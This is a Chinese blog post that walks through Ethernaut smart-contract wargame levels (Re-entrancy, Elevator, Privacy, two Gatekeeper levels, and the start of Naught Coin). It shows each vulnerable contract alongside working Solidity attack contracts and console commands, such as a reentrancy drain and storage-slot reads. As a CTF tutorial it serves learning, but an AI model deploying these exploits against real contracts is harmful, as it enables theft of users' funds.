<!DOCTYPE html>
<html lang="zh-CN">
    <head prefix="og: https://ogp.me/ns#">
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <meta name="color-scheme" content="light dark">
  
  <title>【Ethernaut闯关录】中篇 - 黄阿信</title>
  
    <link rel="shortcut icon" href="/favicon.png">
  
  
    <link rel='manifest' href='/manifest.json'>
  

  
  
  
  <meta property="og:title" content="【Ethernaut闯关录】中篇 - 黄阿信" />
  
  <meta property="og:type" content="article" />
  
  <meta property="og:url" content="https://yalexin.gitee.io/2023/03/11/%E3%80%90Ethernaut%E9%97%AF%E5%85%B3%E5%BD%95%E3%80%91%E4%B8%AD%E7%AF%87/index.html" />
  
  <meta property="og:image" content="/favicon.png" />
  
  <meta property="og:article:published_time" content="2023-03-11T11:24:47.000Z" />
  
  <meta property="og:article:author" content="YaleXin" />
  
  

  
<link rel="stylesheet" href="/css/var.css">

  
<link rel="stylesheet" href="/css/main.css">

  
<link rel="stylesheet" href="/css/typography.css">

  
<link rel="stylesheet" href="/css/code-highlighting.css">

  
<link rel="stylesheet" href="/css/components.css">

  
<link rel="stylesheet" href="/css/nav.css">

  
<link rel="stylesheet" href="/css/paginator.css">

  
<link rel="stylesheet" href="/css/footer.css">

  
<link rel="stylesheet" href="/css/post-list.css">

  
  
<link rel="stylesheet" href="/css/rainbow-banner.css">

  
  
  
<link rel="stylesheet" href="/css/toc.css">

  
  
  
  
  
<link rel="stylesheet" href="/css/post.css">

  
  
  
  
  

  
</head>
    <body
        data-color-scheme="auto"
        data-uppercase-categories="true"
        
        data-rainbow-banner="true"
        data-rainbow-banner-shown="auto"
        data-rainbow-banner-month="6"
        data-rainbow-banner-colors="#e50000,#ff8d00,#ffee00,#008121,#004cff,#760188"
        
        data-config-root="/"
        
        data-toc="true"
        data-toc-max-depth="2"
        
        
    >
        <nav id="theme-nav">
    <div class="inner">
        <a class="title" href="/">Blog</a>
        <div class="nav-arrow"></div>
        <div class="nav-items">
            <a class="nav-item nav-item-home" href="/">Home</a>
            
            
            <a class="nav-item" href="/archives">Archives</a>
            
            
            
            <a class="nav-item" href="/friends">Friends</a>
            
            
            
            <a class="nav-item" href="/projects">Projects</a>
            
            
            
            <a class="nav-item" href="/about">About</a>
            
            
            
            <a class="nav-item nav-item-github nav-item-icon" href="https://github.com/MrWillCom" target="_blank" aria-label="GitHub">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-codepen nav-item-icon" href="https://codepen.io/mrwillcom" target="_blank" aria-label="CodePen">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-patreon nav-item-icon" href="https://www.patreon.com/MrWillCom" target="_blank" aria-label="Patreon">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-mastodon nav-item-icon" href="https://noc.social/@MrWillCom" target="_blank" aria-label="Mastodon">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-discord nav-item-icon" href="https://discord.gg/UKuFDjcfY8" target="_blank" aria-label="Discord">&nbsp;</a>
            
            
            
            <a class="nav-item nav-item-search nav-item-icon" href="/search" target="_blank" aria-label="Search">&nbsp;</a>
            
            
        </div>
    </div>
</nav>
        
<article class="post">
    <div class="meta">
        
        <div class="categories text-uppercase">
        
            <a href="/categories/网络攻防/">网络攻防</a>
        
        </div>
        

        
        <div class="date" id="date">
            <span>March</span>
            <span>11,</span>
            <span>2023</span>
        </div>
        

        <h1 class="title">【Ethernaut闯关录】中篇</h1>
    </div>

    <div class="divider"></div>

    <div class="content">
        <p>原文再续，书接上回，本文继续闯关，本次我们来学习重入漏洞、Solidity存储布局、ERC20代币标准、delegatecall、交易追踪和字节码等知识。<a id="more"></a></p>
<h2 id="Re-entrancy"><a href="#Re-entrancy" class="headerlink" title="Re-entrancy"></a>Re-entrancy</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.6.12;</span><br><span class="line"></span><br><span class="line">import &#39;openzeppelin-contracts-06&#x2F;math&#x2F;SafeMath.sol&#39;;</span><br><span class="line"></span><br><span class="line">contract Reentrance &#123;</span><br><span class="line">  </span><br><span class="line">  using SafeMath for uint256;</span><br><span class="line">  mapping(address &#x3D;&gt; uint) public balances;</span><br><span class="line"></span><br><span class="line">  function donate(address _to) public payable &#123;</span><br><span class="line">    balances[_to] &#x3D; balances[_to].add(msg.value);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function balanceOf(address _who) public view returns (uint balance) &#123;</span><br><span class="line">    return balances[_who];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function withdraw(uint _amount) public &#123;</span><br><span class="line">    if(balances[msg.sender] &gt;&#x3D; _amount) &#123;</span><br><span class="line">      (bool result,) &#x3D; msg.sender.call&#123;value:_amount&#125;(&quot;&quot;);</span><br><span class="line">      if(result) &#123;</span><br><span class="line">        _amount;</span><br><span class="line">      &#125;</span><br><span class="line">      balances[msg.sender] -&#x3D; _amount;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  receive() external payable &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>通关条件：将合约代币都偷走。</p>
<p>考察的是重入漏洞，该漏洞恐怕是智能合约上面最臭名昭著的漏洞了，<code>withdraw</code>函数中，先进行转账(以<code>call</code>的方式)，然后才更新余额，那么如果转账目的方是一个合约账户，在转账过程又会继续调用<code>withdraw</code>函数，则此时<code>balances[msg.sender]</code>来不及更新，则会造成合约的代币被盗取。著名的DAO攻击就是利用了该漏洞。</p>
<p>具体而言，参照下面的合约：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">interface Target&#123;</span><br><span class="line">     function donate(address _to) external payable ;</span><br><span class="line">     function withdraw(uint _amount) external ;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">contract ReEntrancyAttack &#123;</span><br><span class="line">	address public instance ;</span><br><span class="line">  	constructor(address _instance) payable &#123;</span><br><span class="line">        instance &#x3D; _instance;  </span><br><span class="line">  	&#125;</span><br><span class="line">    fallback()payable external&#123;</span><br><span class="line">    &#x2F;&#x2F; 通过查看可知，Reentrance 合约中有 0.001 ether</span><br><span class="line">        Target target &#x3D; Target(instance);</span><br><span class="line">        target.withdraw(0.001 ether);</span><br><span class="line">    &#125;</span><br><span class="line">    function donate()public returns(bool)&#123;</span><br><span class="line">        Target target &#x3D; Target(instance);</span><br><span class="line">        target.donate&#123;value: 0.001 ether&#125;(address(this));</span><br><span class="line">    &#125;</span><br><span class="line">    function attack()public returns(bool)&#123;</span><br><span class="line">        Target target &#x3D; Target(instance);</span><br><span class="line">        target.withdraw(0.001 ether);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>攻击流程：我们部署我们的攻击合约（部署的时候传入<code>Reentrance</code>合约地址），同时往攻击合约<code>ReEntrancyAttack</code>中转入0.001 ether，接着调用<code>donate</code>，然后在控制台输入<code>fromWei(await contract.balanceOf(&#39;0x11Ef368C1D3226dce5c53A9880b0DF148Ea3D0a1&#39;))</code>即可发现我们已经放入<code>0.001 ether</code>,此时可以调用我们的<code>attack</code>函数，调用完毕，我们的攻击合约将会得到<code>0.002 ether</code>，即我们不仅拿回了原本放进合约<code>Reentrance</code>中的<code>0.001 ether</code>，还顺带把<code>Reentrance</code>本身有的<code>0.001 ether</code>拿了过来。</p>
<h2 id="Elevator"><a href="#Elevator" class="headerlink" title="Elevator"></a>Elevator</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">interface Building &#123;</span><br><span class="line">&#x2F;&#x2F; 判断是不是最后一层</span><br><span class="line">  function isLastFloor(uint) external returns (bool);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">contract Elevator &#123;</span><br><span class="line">  bool public top;</span><br><span class="line">  uint public floor;</span><br><span class="line"></span><br><span class="line">  function goTo(uint _floor) public &#123;</span><br><span class="line">    Building building &#x3D; Building(msg.sender);</span><br><span class="line">    &#x2F;&#x2F; 如果指定层_floor不是最后一层，则移动到该指定层，并继续判断</span><br><span class="line">    if (! building.isLastFloor(_floor)) &#123;</span><br><span class="line">      floor &#x3D; _floor;</span><br><span class="line">      top &#x3D; building.isLastFloor(floor);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>通关条件：将<code>top</code>置为<code>ture</code>。</p>
<p>本题目和<code>solidity</code>特性好像关联不是很大，考察的是逻辑漏洞，我们想要<code>top</code>为真，则<code>if</code>语句的<code>building.isLastFloor(_floor)</code>必须返回<code>false</code>，但是下面的19行处<code>building.isLastFloor(floor)</code>又要求返回<code>true</code>，对相同值返回不同的结果，看上去貌似矛盾，其实，我们可以这样子想想，只要第一次调用<code>isLastFloor</code>返回是<code>false</code>,后面调用再返回<code>true</code>不就行了吗？如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">contract ElevatorAttack&#123;</span><br><span class="line">    uint public state;</span><br><span class="line">    constructor()&#123;</span><br><span class="line">    	state &#x3D; 0;</span><br><span class="line">    &#125;</span><br><span class="line">    function isLastFloor(uint) external returns (bool)&#123;</span><br><span class="line">    &#x2F;&#x2F; 第一次调用</span><br><span class="line">		if (state &#x3D;&#x3D; 0)&#123;</span><br><span class="line">			state &#x3D; state + 1;</span><br><span class="line">			return false;</span><br><span class="line">		&#125; else&#123;</span><br><span class="line">		&#x2F;&#x2F; 第二次及以后</span><br><span class="line">			return true;</span><br><span class="line">		&#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Privacy"><a href="#Privacy" class="headerlink" title="Privacy"></a>Privacy</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract Privacy &#123;</span><br><span class="line"></span><br><span class="line">  bool public locked &#x3D; true;</span><br><span class="line">  uint256 public ID &#x3D; block.timestamp;</span><br><span class="line">  uint8 private flattening &#x3D; 10;</span><br><span class="line">  uint8 private denomination &#x3D; 255;</span><br><span class="line">  uint16 private awkwardness &#x3D; uint16(block.timestamp);</span><br><span class="line">  bytes32[3] private data;</span><br><span class="line"></span><br><span class="line">  constructor(bytes32[3] memory _data) &#123;</span><br><span class="line">    data &#x3D; _data;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  function unlock(bytes16 _key) public &#123;</span><br><span class="line">    require(_key &#x3D;&#x3D; bytes16(data[2]));</span><br><span class="line">    locked &#x3D; false;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  &#x2F;*</span><br><span class="line">    A bunch of super advanced solidity algorithms...</span><br><span class="line"></span><br><span class="line">      ,*&#39;^&#96;*.,*&#39;^&#96;*.,*&#39;^&#96;*.,*&#39;^&#96;*.,*&#39;^&#96;*.,*&#39;^&#96;</span><br><span class="line">      .,*&#39;^&#96;*.,*&#39;^&#96;*.,*&#39;^&#96;*.,*&#39;^&#96;*.,*&#39;^&#96;*.,*&#39;^&#96;*.,</span><br><span class="line">      *.,*&#39;^&#96;*.,*&#39;^&#96;*.,*&#39;^&#96;*.,*&#39;^&#96;*.,*&#39;^&#96;*.,*&#39;^&#96;*.,*&#39;^         ,---&#x2F;V\</span><br><span class="line">      &#96;*.,*&#39;^&#96;*.,*&#39;^&#96;*.,*&#39;^&#96;*.,*&#39;^&#96;*.,*&#39;^&#96;*.,*&#39;^&#96;*.,*&#39;^&#96;*.    ~|__(o.o)</span><br><span class="line">      ^&#96;*.,*&#39;^&#96;*.,*&#39;^&#96;*.,*&#39;^&#96;*.,*&#39;^&#96;*.,*&#39;^&#96;*.,*&#39;^&#96;*.,*&#39;^&#96;*.,*&#39;  UU  UU</span><br><span class="line">  *&#x2F;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>通关条件</strong>：将<code>locked</code>改为<code>false</code></p>
<p>跟<code>Vault</code>关卡很像，可以说是它的升级版，在这里就得好好说一下solidity中的状态变量存储方式了，参考<a href="https://learnblockchain.cn/docs/solidity/internals/layout_in_storage.html" target="_blank" rel="noopener">【官方文档】</a>，我们可知：</p>
<blockquote>
<p>存储大小少于 32 字节的多个变量会被打包到一个 存储插槽storage slot 中，规则如下：</p>
<ul>
<li>存储插槽storage slot 的第一项会以低位对齐的方式储存。</li>
<li>值类型仅使用存储它们所需的字节。</li>
<li>如果 存储插槽storage slot 中的剩余空间不足以储存一个值类型，那么它会被存入下一个 存储插槽storage slot 。</li>
<li>结构体（struct）和数组数据总是会开启一个新插槽（但结构体或数组中的各元素，则按规则紧密打包）。</li>
<li>结构体和数组之后的数据也或开启一个新插槽。</li>
</ul>
</blockquote>
<p>由于 映射mapping 和动态数组不可预知大小，不能在状态变量之间存储他们。相反，他们自身根据 <a href="https://learnblockchain.cn/docs/solidity/internals/layout_in_storage.html#storage-inplace-encoding" target="_blank" rel="noopener">以上规则</a> 仅占用 32 个字节，然后他们包含的元素的存储的其实位置，则是通过 Keccak-256 哈希计算来确定，比较复杂，可以在<a href="https://learnblockchain.cn/docs/solidity/internals/layout_in_storage.html" target="_blank" rel="noopener">【文档】</a>中查看，这里不涉及，就不带大家看了。</p>
<p>因此根据变量类型和对应占用字节数，<code>Privacy</code>中的存储分布大致如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">----------------------------------------------------------------</span><br><span class="line">|              unused (30)                         | locked (1)| &lt;- slot 0</span><br><span class="line">----------------------------------------------------------------</span><br><span class="line">|                          ID (32)                             | &lt;- slot 1</span><br><span class="line">----------------------------------------------------------------</span><br><span class="line">|   unused(28)   | awkwardness(2)|denomination(1)|flattening(1)| &lt;- slot 2</span><br><span class="line">----------------------------------------------------------------</span><br><span class="line">|                         data[0] (32)                         | &lt;- slot 3</span><br><span class="line">----------------------------------------------------------------</span><br><span class="line">|                         data[1] (32)                         | &lt;- slot 4</span><br><span class="line">----------------------------------------------------------------</span><br><span class="line">|                         data[2] (32)                         | &lt;- slot 5</span><br><span class="line">----------------------------------------------------------------</span><br></pre></td></tr></table></figure>

<p>因此我们使用</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">await</span> web3.eth.getStorageAt(instance, <span class="string">"5"</span>)</span><br><span class="line">&gt; <span class="string">'0xa264a1b3d12c27658b731ce1c5c631521539801e9e246f3c0e3e03dd408a8de8'</span></span><br></pre></td></tr></table></figure>

<p>就可以获取<code>data[2]</code>了，但是<code>bytes16(data[2])</code>会截取其低位的值，又因为对其方式，因此<code>a264a1b3d12c27658b731ce1c5c63152</code>才是我们想要的结果。</p>
<h2 id="Gatekeeper-One"><a href="#Gatekeeper-One" class="headerlink" title="Gatekeeper One"></a>Gatekeeper One</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract GatekeeperOne &#123;</span><br><span class="line"></span><br><span class="line">  address public entrant;</span><br><span class="line"></span><br><span class="line">  modifier gateOne() &#123;</span><br><span class="line">    require(msg.sender !&#x3D; tx.origin);</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  modifier gateTwo() &#123;</span><br><span class="line">    require(gasleft() % 8191 &#x3D;&#x3D; 0);</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  modifier gateThree(bytes8 _gateKey) &#123;</span><br><span class="line">      require(uint32(uint64(_gateKey)) &#x3D;&#x3D; uint16(uint64(_gateKey)), &quot;GatekeeperOne: invalid gateThree part one&quot;);</span><br><span class="line">      require(uint32(uint64(_gateKey)) !&#x3D; uint64(_gateKey), &quot;GatekeeperOne: invalid gateThree part two&quot;);</span><br><span class="line">      require(uint32(uint64(_gateKey)) &#x3D;&#x3D; uint16(uint160(tx.origin)), &quot;GatekeeperOne: invalid gateThree part three&quot;);</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) &#123;</span><br><span class="line">    entrant &#x3D; tx.origin;</span><br><span class="line">    return true;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>通关条件</strong>：正常执行完<code>enter</code>函数。</p>
<p>我们先来看看，如何绕过三个<code>gate</code>函数，第一个可以参照<code>Telephone</code>关卡，借助第三方合约即可。</p>
<p>对于第二个函数，<code>gasleft()</code>返回的是当前可用的<code>gas</code>，这个要你知道该合约运行到这一行时候，所消耗的<code>gas</code>，需要我们直到题目使用的编译器，然后放到本地调试，这种方法太麻烦了，所以我选择枚举，即调用时候设置gas为<code>n*8191+x</code>，不断改变x，再调用即可。</p>
<p>对于第三个函数，假设<code>_gatekey</code>可以被下面数字表示：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0xab cd ef gh ij kl mn op</span><br></pre></td></tr></table></figure>

<p>对于第一个条件，要求<code>ijklmnop==0000mnop</code>,即<code>ijkl=0000</code>，</p>
<p>对于第二个条件，要求<code>00000000ijklmnop!=abcdefghijklmnop</code>，即<code>00000000!=abcdefgh</code></p>
<p>第三个条件，要求<code>ijklmnop==0000xxxx</code>，其中，<code>xxxx</code>是<code>tx.origin</code>的低两个字节。</p>
<p>故，满足条件的一个<code>_gateKey</code>为<code>1111111100001df4</code>（我的metamask账户的最低两字节是<code>1df4</code>）</p>
<p>综上，我们可以借助下面的攻击合约：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract GatekeeperOneAttack &#123;</span><br><span class="line">    function attack() public &#123;</span><br><span class="line">        &#x2F;&#x2F; 	该地址可以在控制台中输入 &#96;instance&#96; 获取</span><br><span class="line">        address _addr &#x3D; 0x8F29B1467240Ccd340BD33371559cC76729b8e27;</span><br><span class="line">        bytes8 _gateKey &#x3D; 0x1111111100001df4;</span><br><span class="line">        for(uint x &#x3D; 0; x &lt; 8191; x +&#x3D; 1)&#123;</span><br><span class="line">            (bool success, bytes memory data) &#x3D; _addr.call&#123;gas: 81910 + x&#125;(</span><br><span class="line">                abi.encodeWithSignature(&quot;enter(bytes8)&quot;, _gateKey)</span><br><span class="line">            );</span><br><span class="line">            if(success)&#123;</span><br><span class="line">                break;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Gatekeeper-Two"><a href="#Gatekeeper-Two" class="headerlink" title="Gatekeeper Two"></a>Gatekeeper Two</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract GatekeeperTwo &#123;</span><br><span class="line"></span><br><span class="line">  address public entrant;</span><br><span class="line"></span><br><span class="line">  modifier gateOne() &#123;</span><br><span class="line">    require(msg.sender !&#x3D; tx.origin);</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  modifier gateTwo() &#123;</span><br><span class="line">    uint x;</span><br><span class="line">    assembly &#123; x :&#x3D; extcodesize(caller()) &#125;</span><br><span class="line">    require(x &#x3D;&#x3D; 0);</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  modifier gateThree(bytes8 _gateKey) &#123;</span><br><span class="line">    require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) &#x3D;&#x3D; type(uint64).max);</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) &#123;</span><br><span class="line">    entrant &#x3D; tx.origin;</span><br><span class="line">    return true;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><strong>通关条件</strong>：正常执行完<code>enter</code>函数。</p>
<p>关于第一个条件，参照关卡【Gatekeeper One】即可。</p>
<p>但是第二个条件又要要求调用者的地址上不能没有代码，即貌似调用者必须是一个外部账户（EOA）？其实不然，如果一个合约，在构造函数运行阶段，对该地址调用<code>extcodesize</code>，则返回的是零，我们利用这一点即可。</p>
<p>对于第三个，先是对我们的调用方的地址进行打包，又进行计算哈希，又是转数组，又是转64位无符号整数的，最后还要和一个数字异或，看似很复杂，其实，我们可用使用异或的逆操作，即：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">x ^ y &#x3D; z</span><br><span class="line">则 x &#x3D; y ^ z</span><br></pre></td></tr></table></figure>

<p>最终，攻击的合约如下：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">contract GatekeeperTwoAttack &#123;</span><br><span class="line">     constructor()  &#123;</span><br><span class="line">        &#x2F;&#x2F; 	该地址可以在控制台中输入 &#96;instance&#96; 获取</span><br><span class="line">        address _addr &#x3D; 0x0aD80881e0C2b8294beA62b5916Bb0029b93922e;</span><br><span class="line">        bytes8 _gateKey &#x3D; bytes8(type(uint64).max ^ uint64(bytes8(keccak256(abi.encodePacked(this)))));</span><br><span class="line">    	_addr.call(</span><br><span class="line">                abi.encodeWithSignature(&quot;enter(bytes8)&quot;, _gateKey)</span><br><span class="line">            );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="Naught-Coin"><a href="#Naught-Coin" class="headerlink" title="Naught Coin"></a>Naught Coin</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;&#x2F; SPDX-License-Identifier: MIT</span><br><span class="line">pragma solidity ^0.8.0;</span><br><span class="line"></span><br><span class="line">import &#39;openzeppelin-contracts-08&#x2F;token&#x2F;ERC20&#x2F;ERC20.sol&#39;;</span><br><span class="line"></span><br><span class="line"> contract NaughtCoin is ERC20 &#123;</span><br><span class="line"></span><br><span class="line">  &#x2F;&#x2F; string public constant name &#x3D; &#39;NaughtCoin&#39;;</span><br><span class="line">  &#x2F;&#x2F; string public constant symbol &#x3D; &#39;0x0&#39;;</span><br><span class="line">  &#x2F;&#x2F; uint public constant decimals &#x3D; 18;</span><br><span class="line">  uint public timeLock &#x3D; block.timestamp + 10 * 365 days;</span><br><span class="line">  uint256 public INITIAL_SUPPLY;</span><br><span class="line">  address public player;</span><br><span class="line"></span><br><span class="line">  constructor(address _player) </span><br><span class="line">  ERC20(&#39;NaughtCoin&#39;, &#39;0x0&#39;) &#123;</span><br><span class="line">    player &#x3D; _player;</span><br><span class="line">    INITIAL_SUPPLY 